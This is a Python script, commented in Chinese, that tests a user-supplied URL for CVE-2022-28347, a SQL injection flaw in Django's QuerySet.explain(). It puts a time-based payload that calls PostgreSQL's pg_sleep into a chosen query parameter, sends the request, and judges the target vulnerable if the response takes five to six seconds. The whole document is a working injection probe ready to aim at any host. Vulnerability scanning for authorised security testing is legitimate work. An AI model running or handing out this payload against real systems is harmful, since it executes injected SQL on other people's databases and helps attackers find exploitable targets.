import sys
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

def replace_url_param(url, param_name, new_value):
    # 解析URL
    parsed_url = urlparse(url)
    # 解析参数
    params = parse_qs(parsed_url.query)

    # 替换参数值
    params[param_name] = [new_value]

    # 构建新的查询字符串
    encoded_params = "&".join([f"{k}={v[0]}" for k, v in params.items()])

    # 构建新的URL
    new_url_parts = list(parsed_url)
    new_url_parts[4] = encoded_params

    new_url = urlunparse(new_url_parts)

    return new_url

if len(sys.argv) < 4:
    print("请提供要导入的URL和参数名")
    sys.exit(1)

url = None
param_name = None

# 解析命令行参数
for i in range(1, len(sys.argv)):
    if sys.argv[i] == '-u':
        if i+1 < len(sys.argv):
            url = sys.argv[i+1]
    elif sys.argv[i] == '-p':
        if i+1 < len(sys.argv):
            param_name = sys.argv[i+1]

# 检查是否获取到所有必要参数
if url is None or param_name is None:
    print("请提供要导入的URL和参数名")
    sys.exit(1)

new_value = '''{"ANALYZE)+select+pg_sleep(5);--+":"test"}''' # payload

new_url = replace_url_param(url, param_name, new_value)
print(new_url)
# 发送请求并计算响应时间
response = requests.get(new_url)
response_time = response.elapsed.total_seconds()
print(f'响应时间:{response_time}')

if 5 < response_time < 6:
    print("存在CVE-2022-28347漏洞")
else:
    print("不存在CVE-2022-28347漏洞")
